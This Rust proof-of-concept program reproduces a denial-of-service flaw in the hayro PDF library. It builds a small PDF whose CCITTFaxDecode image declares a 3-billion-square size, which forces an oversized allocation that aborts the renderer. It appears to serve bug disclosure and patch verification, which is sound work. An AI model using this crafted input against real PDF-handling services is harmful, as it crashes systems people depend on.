// Standalone reproduction for candidate 004: hayro-syntax's CCITTFaxDecode filter has no
// total-pixel cap on the (untrusted) `columns`/`rows` it derives from a PDF image's own
// `/Width`/`/Height`/DecodeParms `/Columns`/`/Rows`, and eagerly allocates a `columns * rows`
// byte output buffer *before* decoding any actual data. A tiny PDF that declares an absurd image
// size (independent of the page's own, ordinary-sized, MediaBox) forces an allocation request far
// beyond any real address space, aborting the whole process.
//
// This drives the exact same public entry point a real PDF viewer built on `hayro` uses:
// `hayro::render(page, ...)` on a page parsed from real, on-disk-shaped PDF bytes via
// `hayro::hayro_syntax::Pdf::new`.
//
// Exit code convention: 0 = did not reproduce (patched - bug absent), abort/non-zero = reproduced.

use hayro::hayro_interpret::InterpreterSettings;
use hayro::hayro_syntax::Pdf;
use hayro::{RenderCache, RenderSettings, render};

/// Builds a minimal, syntactically valid PDF: a single 200x200pt page drawing one image XObject
/// that uses `CCITTFaxDecode` and declares an absurd width/height (3 billion x 3 billion) in both
/// the image dictionary and its own `DecodeParms` - independent of, and much larger than, the
/// page's own small MediaBox. The actual encoded stream is 4 arbitrary bytes; it is never reached
/// because the eager output-buffer allocation happens before any of it is decoded.
fn build_poc_pdf() -> Vec<u8> {
    let img_dict = b"<< /Type /XObject /Subtype /Image /Width 3000000000 /Height 3000000000 \
/BitsPerComponent 1 /ColorSpace /DeviceGray /Filter /CCITTFaxDecode \
/DecodeParms << /K -1 /Columns 3000000000 /Rows 3000000000 >> /Length 4 >>"
        .to_vec();
    let img_stream: &[u8] = b"\x00\x00\x00\x00";
    let mut obj4 = img_dict;
    obj4.extend_from_slice(b"\nstream\n");
    obj4.extend_from_slice(img_stream);
    obj4.extend_from_slice(b"\nendstream");

    let content: &[u8] = b"q 100 0 0 100 50 50 cm /Im0 Do Q";
    let mut obj5 = format!("<< /Length {} >>\nstream\n", content.len()).into_bytes();
    obj5.extend_from_slice(content);
    obj5.extend_from_slice(b"\nendstream");

    let objs: Vec<Vec<u8>> = vec![
        b"<< /Type /Catalog /Pages 2 0 R >>".to_vec(),
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>".to_vec(),
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources << /XObject << /Im0 4 0 R >> >> /Contents 5 0 R >>".to_vec(),
        obj4,
        obj5,
    ];

    let mut out = Vec::new();
    out.extend_from_slice(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n");

    let mut offsets = Vec::new();
    for (i, obj) in objs.iter().enumerate() {
        offsets.push(out.len());
        out.extend_from_slice(format!("{} 0 obj\n", i + 1).as_bytes());
        out.extend_from_slice(obj);
        out.extend_from_slice(b"\nendobj\n");
    }

    let xref_offset = out.len();
    let n = objs.len() + 1;
    out.extend_from_slice(format!("xref\n0 {n}\n").as_bytes());
    out.extend_from_slice(b"0000000000 65535 f \n");
    for off in &offsets {
        out.extend_from_slice(format!("{off:010} 00000 n \n").as_bytes());
    }
    out.extend_from_slice(format!("trailer\n<< /Size {n} /Root 1 0 R >>\n").as_bytes());
    out.extend_from_slice(format!("startxref\n{xref_offset}\n%%EOF").as_bytes());

    out
}

fn main() {
    let pdf_bytes = build_poc_pdf();
    println!("built PoC PDF: {} bytes", pdf_bytes.len());

    let pdf = Pdf::new(pdf_bytes).expect("PoC PDF should parse");
    let page = pdf.pages().iter().next().expect("PoC PDF has one page");

    let (w, h) = page.render_dimensions();
    println!("page render dimensions (from MediaBox, ordinary-sized): {w} x {h}");

    let settings = InterpreterSettings::default();
    let render_settings = RenderSettings::default();
    let cache = RenderCache::new();

    println!(
        "rendering page (the embedded image declares 3,000,000,000 x 3,000,000,000 px - \
if there is no total-pixel cap, this is where an oversized allocation is attempted)..."
    );

    let pixmap = render(page, &cache, &settings, &render_settings);

    println!(
        "did not reproduce - rendered successfully, {}x{} px pixmap",
        pixmap.width(),
        pixmap.height()
    );
}
